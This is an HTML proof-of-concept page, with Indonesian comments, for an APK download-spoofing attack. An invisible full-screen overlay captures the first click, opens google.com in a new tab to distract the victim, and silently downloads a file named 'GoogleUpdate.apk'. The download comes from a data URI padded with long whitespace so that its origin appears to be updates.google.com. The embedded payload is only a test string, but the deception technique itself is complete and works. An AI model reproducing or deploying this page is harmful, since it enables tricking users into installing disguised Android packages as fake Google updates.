<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>POC Mod 1 - APK Spoofing</title>
</head>
<body>
  <center><h2>Klik di mana saja untuk melanjutkan</h2></center>
  <div id="triggerZone" style="position:fixed; top:0; left:0; width:100%; height:100%; z-index:999; cursor:pointer;"></div>

  <script>
    document.getElementById('triggerZone').addEventListener('click', function() {
      // Membuka tab baru ke Google asli untuk mengelabui korban
      window.open('https://www.google.com', '_blank');
      
      // Menjalankan download otomatis di latar belakang setelah tab baru terbuka
      setTimeout(function() {
        downloadSpoof();
      }, 300);
    }, { once: true }); // Dibuat 'once: true' agar tidak terjadi loop download

    function pufHelper(uri, name) {
      const link = document.createElement("a");
      link.href = uri;
      link.download = name;
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
    }

    function downloadSpoof() {
      // Menggunakan payload spasi panjang untuk menyembunyikan ekstensi asli
      pufHelper(
        "data:https://updates.google.com/                                                                                                                                                                                                                                                              application/vnd.android.package-archive;base64,ZXN0dGVzdGVzdHRlc3Q=",
        "GoogleUpdate.apk" // Nama file diubah menjadi APK tiruan
      );
    }
  </script>
</body>
</html>
